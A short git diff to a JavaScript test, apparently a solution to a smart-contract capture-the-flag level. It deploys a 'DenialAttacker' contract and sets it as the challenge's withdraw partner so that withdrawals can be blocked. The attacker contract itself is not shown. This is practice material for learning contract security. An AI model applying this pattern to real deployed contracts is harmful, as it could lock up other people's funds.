@@ -21,6 +21,12 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
+
+  const attackerFactory = await ethers.getContractFactory('DenialAttacker')
+  let attacker = await attackerFactory.connect(eoa).deploy(challenge.address)
+
+  await challenge.connect(eoa).setWithdrawPartner(attacker.address)
+  
 });
 
 after(async () => {
